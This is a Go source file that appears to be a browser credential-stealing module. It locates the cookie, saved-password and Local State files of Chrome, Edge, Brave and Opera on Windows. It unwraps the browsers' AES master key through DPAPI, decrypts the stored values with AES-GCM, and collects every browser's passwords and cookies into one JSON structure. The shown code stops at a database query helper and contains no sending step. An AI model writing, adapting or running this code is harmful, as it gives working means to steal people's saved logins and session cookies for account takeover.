package chromium

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

const (
	dllCrypt32Name  = "Crypt32.dll"
	dllKernel32Name = "Kernel32.dll"

	operaCookiesPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Network\\Cookies"
	edgeCookiesPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"
	braveCookiesPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
	chromeCookiesPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"

	operaPasswordPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
	edgePasswordPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
	bravePasswordPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
	chromePasswordPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"

	operaKeyPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"
	edgeKeyPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
	braveKeyPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
	chromeKeyPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"

	chromiumCookieQuery = `SELECT host_key as Domain, expires_utc as Expires, 
		is_httponly as HttpOnly, name as Name, path as Path, 
		is_secure as Secure, value as Value, encrypted_value as EncryptedValue 
		FROM cookies;`
	chromiumPasswordQuery = `SELECT origin_url as URL, username_value as Username, password_value as Password FROM logins;`
)

// Cookie represents a cookie stored by a web browser.
type Cookie struct {
	Name           string `json:"name"`
	Value          string `json:"value"`
	Domain         string `json:"domain"`
	Path           string `json:"path"`
	Expires        string `json:"expires"`
	IsExpired      bool   `json:"isExpired"`
	IsSecure       bool   `json:"isSecure"`
	HttpOnly       bool   `json:"httpOnly"`
	EncryptedValue []byte `json:"encryptedValue"`
}

// Password represents a password stored by a web browser.
type Password struct {
	URL               string `json:"url"`
	Username          string `json:"username"`
	PasswordDecrypted string `json:"passwordDecrypted"`
	PasswordEncrypted []byte `json:"passwordEncrypted"`
}

// JSONStruct represents the structure of the JSON output, including all
// passwords and cookies from various browsers.
type JSONStruct struct {
	BravePasswords  []Password `json:"bravePasswords"`
	BraveCookies    []Cookie   `json:"braveCookies"`
	ChromePasswords []Password `json:"chromePasswords"`
	ChromeCookies   []Cookie   `json:"chromeCookies"`
	OperaPasswords  []Password `json:"operaPasswords"`
	OperaCookies    []Cookie   `json:"operaCookies"`
	EdgePasswords   []Password `json:"edgePasswords"`
	EdgeCookies     []Cookie   `json:"edgeCookies"`
}

var (
	DLLCrypt32  = syscall.NewLazyDLL(dllCrypt32Name)
	DLLKernel32 = syscall.NewLazyDLL(dllKernel32Name)

	PCryptUnprotectData = DLLCrypt32.NewProc("CryptUnprotectData")
	PLocalFree          = DLLKernel32.NewProc("LocalFree")
	aesKey              []byte
)

// DataBlob represents a data blob as used by Windows cryptographic functions.
type DataBlob struct {
	cbData uint32
	pbData *byte
}

// toByteArray converts a DataBlob to a byte array.
func (b *DataBlob) toByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

// newBlob creates a new DataBlob from a byte slice.
func newBlob(d []byte) *DataBlob {
	if len(d) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

// decryptValue decrypts a value using either AES GCM or Windows CryptUnprotectData.
func decryptValue(data []byte) ([]byte, error) {
	if bytes.Equal(data[0:3], []byte{'v', '1', '0'}) {
		aesBlock, err := aes.NewCipher(aesKey)
		if err != nil {
			return nil, fmt.Errorf("error creating cipher block: %w", err)
		}

		aesGCM, err := cipher.NewGCM(aesBlock)
		if err != nil {
			return nil, fmt.Errorf("error creating GCM: %w", err)
		}

		nonce := data[3:15]
		encryptedData := data[15:]

		plaintext, err := aesGCM.Open(nil, nonce, encryptedData, nil)
		if err != nil {
			return nil, err
		}

		return plaintext, nil

	} else {
		var outBlob DataBlob
		r, _, err := PCryptUnprotectData.Call(uintptr(unsafe.Pointer(newBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
		if r == 0 {
			return nil, err
		}
		defer PLocalFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))

		return outBlob.toByteArray(), nil
	}
}

// getAesGCMKey retrieves the AES GCM key from a browser's Local State file.
func getAesGCMKey(keyPath string) error {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	localStatePath := filepath.Join(osUser, keyPath)
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return err
	}

	var localState map[string]interface{}
	if err = json.Unmarshal(data, &localState); err != nil {
		return err
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return errors.New("os_crypt key not found in localState")
	}

	encryptedKeyStr, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return errors.New("encrypted_key not found in os_crypt")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyStr)
	if err != nil {
		return err
	}

	if !bytes.Equal(encryptedKey[0:5], []byte{'D', 'P', 'A', 'P', 'I'}) {
		return errors.New("encrypted_key does not look like DPAPI key")
	}

	encryptedKey, err = decryptValue(encryptedKey[5:])
	if err != nil {
		return err
	}

	aesKey = encryptedKey

	return nil
}

// queryDatabase is a helper function to make a query from a SQL database.
func queryDatabase(path, query, keyPath string) (*sql.Rows, error) {
	osUser, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	dbPath := filepath.Join(osUser, path)

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", dbPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	err = getAesGCMKey(keyPath)
	if err != nil {
		return nil, err
	}
	rows, err := dbConn.Query(query)
	if err != nil {
		return nil, err
	}

	return rows, nil
}
